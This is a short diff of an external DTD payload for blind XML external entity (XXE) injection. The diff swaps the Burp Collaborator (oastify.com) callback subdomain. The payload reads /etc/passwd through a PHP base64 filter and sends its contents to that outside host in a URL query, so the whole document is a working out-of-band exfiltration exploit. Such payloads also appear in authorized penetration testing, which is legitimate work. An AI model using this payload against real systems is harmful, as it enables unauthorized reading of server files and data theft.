@@ -1,4 +1,4 @@
 <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
-<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://hk536hofyr6uew606auk4vqsqjwbk38s.oastify.com/?%file;'>">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://b5h1i62spb3w5czohwx8ehs72y8pwfk4.oastify.com/?%file;'>">
 %eval;
 %error;
